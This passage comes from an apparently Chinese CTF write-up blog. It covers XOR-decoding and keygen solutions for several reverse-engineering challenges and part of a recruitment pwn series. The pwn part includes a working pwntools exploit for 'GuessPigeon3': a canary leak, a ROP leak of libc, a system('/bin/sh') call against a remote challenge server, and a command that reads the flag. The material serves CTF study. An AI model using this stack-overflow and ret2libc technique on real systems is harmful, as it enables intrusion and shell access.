class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">data = &quot;M,\x1d-\x18&#125;E&apos;\x1ezN~\x1b*\x19+\x12%\x1d-&quot; + &apos;I\x7fM(I&#123;I\x7fJ.\x16wWcRj\x0e6\x0fn&apos; + &apos;Zo\nn\x0fk\t1R7\x03g\x067\x00eUb\x043&apos; + &apos;\x014\x071Rr\x14x\x19~D?q&quot;a5s,A%&apos; + &quot;\x10&apos;\x11uLyA%\x1d|DrFv\x12t\x11#B&amp;&quot; + &apos;GsKzK*O)\x1c%GuC&gt;\x1e\x7f\x1b+\x19*&apos; + &apos;\x1e&amp;\x14-\x1f/\x1axAqBq@yO-LtE&#125;&apos; + &apos;\x1b,MuBp\x12&apos;</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import cStringIO</span><br><span class="line">import string</span><br><span class="line">import dis</span><br><span class="line">import marshal</span><br><span class="line">import types</span><br><span class="line">import random</span><br><span class="line">count = 0</span><br><span class="line"></span><br><span class="line">def reverse(string):</span><br><span class="line">    return string[::-1]</span><br><span class="line"></span><br><span class="line">data_list = list(reverse(data)[1:])</span><br><span class="line"></span><br><span class="line">def decrpyt(c, key2):</span><br><span class="line">    global count</span><br><span class="line">    data_list[count] = c ^ key2</span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag1():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 8])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 3])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag2():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 11])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 4 - count])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag3():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 5])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 2 - count])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag4():</span><br><span class="line">    global count</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 1])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">        key = struct.unpack(&apos;B&apos;, data[len(data) - 1 - count])[0]</span><br><span class="line">        decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    </span><br><span class="line">    count = 0</span><br><span class="line">    for c in data_list[::-1]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetFlag5():</span><br><span class="line">    key = struct.unpack(&apos;B&apos;, data[len(data) - 9])[0]</span><br><span class="line">    for c in data_list:</span><br><span class="line">        if count == 0:</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">            continue</span><br><span class="line">            key = struct.unpack(&apos;B&apos;, data[len(data) - 3 - count])[0]</span><br><span class="line">            decrpyt(struct.unpack(&apos;B&apos;, c)[0], key)</span><br><span class="line">    for c in data_list[::-12]:</span><br><span class="line">        print chr(c),</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">GetFlag1()</span><br></pre></td></tr></table></figure><p>直接运行一波，发现会对data进行报错，百度后发现时在反编译时，例如<code>0f aa</code>这样的指令时会变成<code>\xfa\xa*</code>这样，就会导致错位⽽而解不出flag。</p><p>这时可以用winhex打开pyc文件，找到data，然后自己进行转换就行了，data用十六进制表示为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4D2C1D2D 187D4527 1E7A4E7E 1B2A192B 12251D2D 73140000 00497F4D 28497B49 7F4A2E16 77576352 6A0E360F 6E731400 00005A6F 0A6E0F6B 09315237 03670637 00655562 04337314 00000001 34073152 72147819 7E443F71 22613573 2C412573 14000000 10271175 4C794125 1D7C4472 46761274 11234226 73140000 0047734B 7A4B2A4F 291C2547 75433E1E 7F1B2B19 2A731400 00001E26 142D1F2F 1A784171 42714079 4F2D4C74 457D7307 0000001B 2C4D7542 7012</span><br></pre></td></tr></table></figure><p>然而运行后得不到flag，不过这里定义了5个getflag函数，一个个尝试后在getflag4时找到了flag。</p><h1 id="NSCTF-Reverse-400"><a href="#NSCTF-Reverse-400" class="headerlink" title="NSCTF Reverse 400"></a>NSCTF Reverse 400</h1><p>py2exe的逆向，参考<a href="https://www.cnblogs.com/pcat/p/8990482.html" target="_blank" rel="noopener">PyInstaller Extractor安装和使用方法</a></p><p>在reverse03里找到了一些代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">data=\&quot;\x1c\x7a\x16\x77\x10\x2a\x51\x1f\x4c\x0f\x5b\x1d\x42\x2f\x4b\x7e\x4a\x7a\x4a\x7b&quot;+\&quot;\x49\x7f\x4a\x7f\x1e\x78\x4c\x75\x10\x28\x18\x2b\x48\x7e\x46\x23\x12\x24\x11\x72&quot;+\&quot;\x4b\x2e\x1b\x7e\x4f\x2b\x12\x76\x0b&quot;</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">char buf[] = &quot;flag:&#123;NSCTF_md5098f6bcd4621d373cade4e832627b4f6&#125;&quot;;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d\n&quot;, strlen(buf));</span><br><span class="line">char key = &apos;\x0b&apos;;</span><br><span class="line">buf[47] ^= key;</span><br><span class="line">for (int i = 1; i &lt; 48; i++)</span><br><span class="line">&#123;</span><br><span class="line">buf[48 - i - 1] ^= buf[48 - i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">print &quot;Revese it?????????&quot;</span><br></pre></td></tr></table></figure><p>直接就给出了flag，然而并不正确，看来给了一段c的代码是要用到的。</p><p>后发现对data进行如c代码的运算后就可以得到flag，逆运算脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">data=&quot;\x1c\x7a\x16\x77\x10\x2a\x51\x1f\x4c\x0f\x5b\x1d\x42\x2f\x4b\x7e\x4a\x7a\x4a\x7b&quot;+&quot;\x49\x7f\x4a\x7f\x1e\x78\x4c\x75\x10\x28\x18\x2b\x48\x7e\x46\x23\x12\x24\x11\x72&quot;+&quot;\x4b\x2e\x1b\x7e\x4f\x2b\x12\x76\x0b&quot;</span><br><span class="line">temp=list(data)</span><br><span class="line">for i in range(0,len(temp)-2):</span><br><span class="line">temp[i]=chr(ord(temp[i])^ord(temp[i+1]))</span><br><span class="line">temp[47]=chr(ord(temp[47])^0x0b)</span><br><span class="line">flag=&apos;&apos;.join(i for i in temp)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h1 id="bin100-ebCTF-2013"><a href="#bin100-ebCTF-2013" class="headerlink" title="bin100(ebCTF 2013)"></a>bin100(ebCTF 2013)</h1><p>一个掷🎲小游戏，掷出需要的数字就能得到flag。</p><p>用od打开，字符串搜索，定位到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040192B     /75 5E         jnz short Dice.0040198B</span><br><span class="line">0040192D   . |C74424 04 1F4&gt;mov dword ptr ss:[esp+0x4],Dice.0044421F ;  [*] You rolled a three! Good!</span><br></pre></td></tr></table></figure><p>可见这里就是判断掷出的🎲是不是需要的数字，如果不是的话，jnz就会使得进程跳到失败，所以把jnz这一句nop掉就可以跳过判断，使程序认为掷出了需要的数字，后面还有四个一样的地方，也nop掉之后f9运行程序，回车掷完🎲之后，f8往下运行就可以得到flag。</p><h1 id="该题不简单"><a href="#该题不简单" class="headerlink" title="该题不简单"></a>该题不简单</h1><p>一开始没仔细看题目，以为成功登陆就可以得到flag…后来发现是要找到对应用户名hello的注册码，还是用ida打开看看吧。</p><p>文本搜索一下无效，找到了关键函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">String[0] = 0;</span><br><span class="line">memset(&amp;String[1], 0, 0x1Cu);</span><br><span class="line">v3 = 0;</span><br><span class="line">v4 = 0;</span><br><span class="line">String1 = 0;</span><br><span class="line">memset(&amp;v10, 0, 0x1Cu);</span><br><span class="line">v11 = 0;</span><br><span class="line">v12 = 0;</span><br><span class="line">String2 = 0;</span><br><span class="line">memset(&amp;v6, 0, 0x1Cu);</span><br><span class="line">v7 = 0;</span><br><span class="line">v8 = 0;</span><br><span class="line">if ( GetDlgItemTextA(hDlg, 1000, String, 16) &lt; 5 )</span><br><span class="line">  return 1;</span><br><span class="line">GetDlgItemTextA(hDlg, 1001, &amp;String1, 16);</span><br><span class="line">v1 = 0;</span><br><span class="line">if ( strlen(String) != 0 )</span><br><span class="line">&#123;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;String2 + v1) = (v1 + v1 * String[v1] * String[v1]) % 0x42 + 33;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v1 &lt; strlen(String) );</span><br><span class="line">&#125;</span><br><span class="line">strcpy(String, &quot;Happy@&quot;);</span><br><span class="line">lstrcatA(String, &amp;String2);</span><br><span class="line">return lstrcmpA(&amp;String1, String) != 0;</span><br></pre></td></tr></table></figure><p>如果这个函数返回1的话就是注册码正确了。<br>输入用户名后，<code>注册码[i]=i+i*用户名[i]*用户名[i]%0x42+33</code>，再在前面加上Happy@就得到注册码了。</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=&quot;hello&quot;</span><br><span class="line">string2=&quot;&quot;</span><br><span class="line">for i in range(len(username)):</span><br><span class="line">string2+=chr(i+i*ord(username[i])*ord(username[i])%0x42 +33)</span><br><span class="line">print &quot;Happy@&quot;+string2</span><br></pre></td></tr></table></figure><p>这样的明文密码用od调试应该会更快一点，可以直接看到注册码是什么。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>geek-no-gdb</title>
      <link href="/2018/10/19/geek-no-gdb/"/>
      <url>/2018/10/19/geek-no-gdb/</url>
      
        <content type="html"><![CDATA[<p><a href="http://geek.sycsec.com/index.php/main/view/challenges" target="_blank" rel="noopener">题目地址</a> 话说好像是要用gdb调试的，然而之前一直没用过gdb，对着教程弄了一会，也许是因为编译时没有-g导致调试不起来，只能拖进ida看看，发现大部分函数也是能看的，不过最关键的一段函数却无法使用f5，只能怼汇编了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">sub_400716      proc near               ; CODE XREF: main+B0↓p</span><br><span class="line"></span><br><span class="line">s               = qword ptr -68h</span><br><span class="line">var_54          = dword ptr -54h</span><br><span class="line">s2              = byte ptr -50h</span><br><span class="line">var_48          = qword ptr -48h</span><br><span class="line">var_40          = qword ptr -40h</span><br><span class="line">var_38          = qword ptr -38h</span><br><span class="line">var_30          = qword ptr -30h</span><br><span class="line">var_28          = word ptr -28h</span><br><span class="line">var_18          = qword ptr -18h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">                push    rbp</span><br><span class="line">                mov     rbp, rsp</span><br><span class="line">                nop</span><br><span class="line">                sub     rsp, 68h</span><br><span class="line">                mov     [rbp+s], rdi</span><br><span class="line">                mov     rax, fs:28h</span><br><span class="line">                mov     [rbp+var_18], rax</span><br><span class="line">                xor     eax, eax</span><br><span class="line">                mov     rax, &apos;kVPSOwmg&apos;</span><br><span class="line">                mov     qword ptr [rbp+s2], rax</span><br><span class="line">                mov     rax, &apos;YkQ\@kQV&apos;</span><br><span class="line">                mov     [rbp+var_48], rax</span><br><span class="line">                mov     rax, &apos;QC[Dk@G[&apos;</span><br><span class="line">                mov     [rbp+var_40], rax</span><br><span class="line">                mov     rax, &apos;kg&#123;kXARF&apos;</span><br><span class="line">                mov     [rbp+var_38], rax</span><br><span class="line">                mov     rax, &apos;FQSSAVQP&apos;</span><br><span class="line">                mov     [rbp+var_30], rax</span><br><span class="line">                mov     [rbp+var_28], &apos;I&apos;</span><br><span class="line">                mov     [rbp+var_54], 0</span><br><span class="line">                jmp     short loc_4007A3</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">loc_400787:                             ; CODE XREF: sub_400716+A2↓j</span><br><span class="line">                mov     eax, [rbp+var_54]</span><br><span class="line">                cdqe</span><br><span class="line">                movzx   eax, [rbp+rax+s2]</span><br><span class="line">                xor     eax, 34h</span><br><span class="line">                mov     edx, eax</span><br><span class="line">                mov     eax, [rbp+var_54]</span><br><span class="line">                cdqe</span><br><span class="line">                mov     [rbp+rax+s2], dl</span><br><span class="line">                add     [rbp+var_54], 1</span><br><span class="line"></span><br><span class="line">loc_4007A3:                             ; CODE XREF: sub_400716+6F↑j</span><br><span class="line">                mov     eax, [rbp+var_54]</span><br><span class="line">                movsxd  rbx, eax</span><br><span class="line">                mov     rax, [rbp+s]</span><br><span class="line">                mov     rdi, rax        ; s</span><br><span class="line">                call    _strlen</span><br><span class="line">                cmp     rbx, rax</span><br><span class="line">                jb      short loc_400787</span><br><span class="line">                lea     rdx, [rbp+s2]</span><br><span class="line">                mov     rax, [rbp+s]</span><br><span class="line">                mov     rsi, rdx        ; s2</span><br><span class="line">                mov     rdi, rax        ; s1</span><br><span class="line">                call    _strcmp</span><br><span class="line">                test    eax, eax</span><br><span class="line">                jnz     short loc_4007DD</span><br><span class="line">                mov     edi, offset s   ; &quot;Yeah!Prison break!&quot;</span><br><span class="line">                call    _puts</span><br><span class="line">                jmp     short loc_4007E7</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">loc_4007DD:                             ; CODE XREF: sub_400716+B9↑j</span><br><span class="line">                mov     edi, offset aNoYouFailed ; &quot;No!You Failed&quot;</span><br><span class="line">                call    _puts</span><br></pre></td></tr></table></figure><p>一通操作就是把一开始的输入读入s，然后再把一个字符串读入s2，如果对于s的每一位异或0x34后与s2相等就ok啦，所以flag=s2^0x34，逆运算脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s2=&quot;gmwOSPVkVQk@\QkY[G@kD[CQFRAXk&#123;gkPQVASSQFI&quot;</span><br><span class="line">flag=&apos;&apos;.join([chr(ord(i)^0x34) for i in s2])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>不知道怎么用gdb真是鶸啊orz</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CNSSrecruit-3</title>
      <link href="/2018/10/15/CNSSrecruit-3/"/>
      <url>/2018/10/15/CNSSrecruit-3/</url>
      
        <content type="html"><![CDATA[<h1 id="GuessPigeon3"><a href="#GuessPigeon3" class="headerlink" title="GuessPigeon3"></a>GuessPigeon3</h1><p>开了canary保护，提供了libc.so文件。<br>参考文章<a href="https://blog.csdn.net/publicStr/article/details/80344321" target="_blank" rel="noopener">write函数泄露+用地址跳回重执行主函数</a></p><p>guess函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned int guess()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+8h] [ebp-70h]</span><br><span class="line">  unsigned int v2; // [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;buf, 0, 0x64u);</span><br><span class="line">  puts(&quot;You You have two chances. Please input your guess:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100u);</span><br><span class="line">  printf(&quot;You guessed the pigeon number is %s .\nI&apos;m sorry, you guessed wrong.&quot;, &amp;buf);</span><br><span class="line">  puts(&quot;Please input your guess again:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100u);</span><br><span class="line">  puts(&quot;You&apos;ve been fooled.There are no pigenos here!\n Good bye~&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v2就是canary，buf存在栈溢出。</p><p>ida打开libc.so.6，找到system的偏移地址。/bin/sh字符串的偏移地址可以用winhex打开libc文件查找（详见参考文章，很给力）。</p><p>第一次输入后会对输入进行一次输出，可以利用这一次输出把canary带出来，在第二次输入中使用来跳过canary保护。</p><p>然后第二次输入时利用栈溢出覆盖掉guess函数的返回地址，调用write函数，输出write函数的真实地址来计算libc的起始地址，就可以计算出system函数的真实地址。同时将write函数的返回地址填充为main函数的地址，这样在第二次输入完之后又会再次进入main函数。</p><p>这样再次进入main函数之后，就可以开shell了。脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf1=ELF(&quot;./GuessPigeon3&quot;)</span><br><span class="line">elf2=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">plt_write=elf1.plt[&quot;write&quot;]</span><br><span class="line">got_write=elf1.got[&quot;write&quot;]</span><br><span class="line">system_libc=0x3ada0</span><br><span class="line">bin_sh_libc=0x15ba0b</span><br><span class="line"></span><br><span class="line">sh=remote(&quot;132.232.34.26&quot;,8888)</span><br><span class="line">sh.recvuntil(&quot;token:&quot;)</span><br><span class="line">sh.sendline(&quot;GuessPigeon3&quot;)</span><br><span class="line">sh.recvuntil(&quot;guess:&quot;)</span><br><span class="line">sh.sendline(&apos;a&apos;*95+&quot;abcde&quot;)</span><br><span class="line">sh.recvuntil(&quot;abcde&quot;)</span><br><span class="line">sh.recv(1)</span><br><span class="line">canary=&apos;\x00&apos;+sh.recv(3)</span><br><span class="line">sh.recvuntil(&quot;again:&quot;)</span><br><span class="line">payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(plt_write)+p32(0x080486c4)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;bye~\n&apos;)</span><br><span class="line">leak=u32(sh.recv(4))</span><br><span class="line">libc_base=leak-elf2.symbols[&apos;write&apos;]</span><br><span class="line">system=libc_base+system_libc</span><br><span class="line">bin_sh=libc_base+bin_sh_libc</span><br><span class="line">sh.recvuntil(&quot;guess:&quot;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&quot;again:&quot;)</span><br><span class="line">payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(system)+p32(1)+p32(bin_sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>发现程序十秒不输入就会自行结束，所以把cat flag的操作也写进脚本吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh.sendline(&quot;cd ..&quot;)</span><br><span class="line">sh.sendline(&quot;cat flag_GuessPigeon3&quot;)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure><h1 id="诡异的修罗铭文"><a href="#诡异的修罗铭文" class="headerlink" title="诡异的修罗铭文"></a>诡异的修罗铭文</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CNSSrecruit-2</title>
      <link href="/2018/10/14/CNSSrecruit-2/"/>
      <url>/2018/10/14/CNSSrecruit-2/</url>
      
        <content type="html"><![CDATA[<h1 id="childNc"><a href="#childNc" class="headerlink" title="childNc"></a>childNc</h1><p>主函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v8 = __readfsqword(0x28u);</span><br><span class="line">setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">puts(&quot;Please input two right numbers:&quot;);</span><br><span class="line">__isoc99_scanf(&quot;%d %d&quot;, &amp;v4, &amp;v5);</span><br><span class="line">v6 = v4 + v5;</span><br><span class="line">v7 = v4 - v5;</span><br><span class="line">if ( v4 + v5 != 19 || v7 != 5 )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Try again~&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Gooood!you get shell!Can you find the flag?\n&quot;);</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>可以发现输入12和7就可以获得shell</p><h1 id="GuessPigeon"><a href="#GuessPigeon" class="headerlink" title="GuessPigeon"></a>GuessPigeon</h1><p><del>程序自带getshell函数，所以只要找一个栈溢出然后把返回地址修改成getshell的地址就ok了，脚本如下</del></p><p>一开始没看一下有没有开什么保护啥的，结果试了半天也没能成功……后来发现开了canary保护，现场百度一波，找到了大佬的教程<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44069&amp;highlight=pwn入门" target="_blank" rel="noopener">Linux pwn入门教程(9)——stack canary与绕过的思路</a>，不过研究了一晚上发现这一题并不需要用到这篇教程里的东西…..</p><p>主程序如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; // eax</span><br><span class="line">  int v4; // ST1C_4</span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  puts(&quot;Welcome to CNSS Recruit 2018\n&quot;);</span><br><span class="line">  puts(&quot;Let&apos;s guess the pigeon number together!&quot;);</span><br><span class="line">  v3 = time(0);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  guess(v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v3就是canary的值，guess函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unsigned int __cdecl guess(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char nptr; // [esp+8h] [ebp-70h]</span><br><span class="line">  unsigned int v3; // [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  puts(&quot;Please input your guess:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%s&quot;, &amp;nptr);</span><br><span class="line">  if ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;My Gooood!You guessed the pigeon number!!&quot;);</span><br><span class="line">    getshell();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;You are wrong!The pigeon&apos;s number is %d\n try again~&quot;, a1);</span><br><span class="line">  